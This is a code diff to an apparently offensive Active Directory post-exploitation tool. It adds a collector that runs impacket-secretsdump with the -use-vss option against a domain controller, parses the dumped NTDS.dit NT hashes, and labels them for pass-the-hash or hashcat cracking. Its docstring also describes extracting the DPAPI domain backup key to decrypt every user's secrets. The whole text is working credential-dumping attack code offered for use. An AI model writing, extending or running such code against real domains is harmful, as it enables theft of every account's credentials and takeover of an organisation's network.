@@ -1,7 +1,8 @@
 """DC-only loot (needs DCSync/DA rights, fails gracefully otherwise):
-  - NTDS.dit domain hashes      (impacket-secretsdump -just-dc-ntlm)
+  - NTDS.dit domain hashes      (impacket-secretsdump -just-dc)
+  - NTDS via VSS shadow copy    (impacket-secretsdump -use-vss)
   - DPAPI domain backup key     (dploot backupkey) -> decrypts every user's DPAPI
-Both only run against a DC (needs_ldap) and only if a cred is admin (needs_admin_dc)."""
+All only run against a DC (needs_ldap) and skip unless a cred is admin on it."""
 from __future__ import annotations
 
 import re
@@ -20,7 +21,7 @@ class NtdsCollector(BaseCollector):
     description = "Full NTDS.dit domain hashes (needs DCSync/DA)"
     per_credential = False
     needs_ldap = True
-    needs_admin_dc = True            # auto-skip unless a cred is admin on the DC
+    needs_admin_dc = True
     requires = ("secretsdump",)
 
     def collect_once(self, cred: Credential) -> List[Secret]:
@@ -39,6 +40,33 @@ class NtdsCollector(BaseCollector):
                 found.append(Secret(self.host, "NTDS", user, nt, Status.HASH,
                                     secret_type="nthash",
                                     notes="domain hash; PtH or hashcat -m 1000"))
+        return found
+
+
+class VssCollector(BaseCollector):
+    name = "VSS"
+    description = "NTDS via VSS shadow copy (alt to DRSUAPI; needs admin on DC)"
+    per_credential = False
+    needs_ldap = True
+    needs_admin_dc = True
+    requires = ("secretsdump",)
+
+    def collect_once(self, cred: Credential) -> List[Secret]:
+        bin_ = find_tool("secretsdump")
+        if not bin_:
+            return []
+        cmd = ([bin_, cred.secretsdump_target(self.host), "-just-dc-ntlm", "-use-vss"]
+               + cred.impacket_extra_args())
+        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
+                  raw_name=self._raw_name(cred))
+        found = []
+        for line in strip_ansi(res.output).splitlines():
+            m = NTDS_RE.match(line.strip())
+            if m:
+                user, _rid, _lm, nt = m.groups()
+                found.append(Secret(self.host, "VSS-NTDS", user, nt, Status.HASH,
+                                    secret_type="nthash",
+                                    notes="domain hash via VSS; PtH or hashcat -m 1000"))
         return found
 
 
